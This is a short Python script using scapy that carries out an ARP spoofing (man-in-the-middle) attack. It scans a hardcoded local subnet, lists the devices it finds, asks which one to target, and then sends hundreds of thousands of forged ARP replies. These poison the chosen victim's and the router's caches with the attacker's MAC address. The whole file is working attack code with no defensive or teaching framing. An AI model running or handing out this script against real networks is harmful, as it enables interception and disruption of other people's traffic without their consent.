import scapy.all as scapy
from scapy.all import *
import time

def send_arp(router_ip, victim_ip, victim_mac,my_mac,router_mac):
    
    arp_victim = Ether(dst=victim_mac) / ARP(op=2, psrc=router_ip, hwsrc=my_mac, pdst=victim_ip,hwdst = victim_mac)
    arp_router = Ether(dst=router_mac) / ARP(op=2, psrc=victim_ip, hwsrc=my_mac, pdst=router_ip,hwdst = router_mac)
    sendp(arp_victim)
    sendp(arp_router)

def search_ips():
    arp_search = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst="10.100.102.0/24",hwdst="ff:ff:ff:ff:ff:ff" )
    answered, unanswered = srp(arp_search, timeout=2, verbose=False)
    devices = []
    count = 0 
    for sent, received in answered:
        count+=1
        ip = received.psrc
        mac = received.hwsrc
        id = count
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except socket.herror:
            hostname = "Unknown"
        devices.append((ip,mac))
        print(f"ID: {id} | IP: {ip} | MAC: {mac} | Hostname: {hostname}")
    target = int(input("Who do you want to target? (ID): "))
    target_ip,target_mac = devices[target-1]
    for i in range (500000):   
        send_arp(router_ip="10.100.102.1", victim_ip=target_ip, victim_mac=target_mac, my_mac="D4:5D:64:20:11:9B", router_mac="34:49:5b:0c:a:f7")

search_ips()